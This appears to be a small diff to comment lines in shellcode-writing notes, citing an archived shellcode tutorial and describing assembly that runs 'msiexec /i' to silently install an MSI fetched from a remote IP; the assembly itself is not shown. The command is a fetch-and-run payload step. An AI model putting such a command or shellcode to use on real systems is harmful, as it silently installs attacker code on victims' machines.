@@ -1,12 +1,12 @@
 https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/12
 
-# Follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!
+#Follow above tutorials to output shellcode or follow dudes write-up....I'm sure it works!
 
-# The following asm does this: #
+#The following asm does this: #
 
-# msiexec /i http*://172.16.0.14/jasonm.msi /qn
+#msiexec /i http*://172.16.0.14/jasonm.msi /qn
 
-# Need to Determine LoadLibrary, ExitProcess & System via Arwin
+#Need to Determine LoadLibrary, ExitProcess & System via Arwin
 
 
 ------------assembly starts---------------
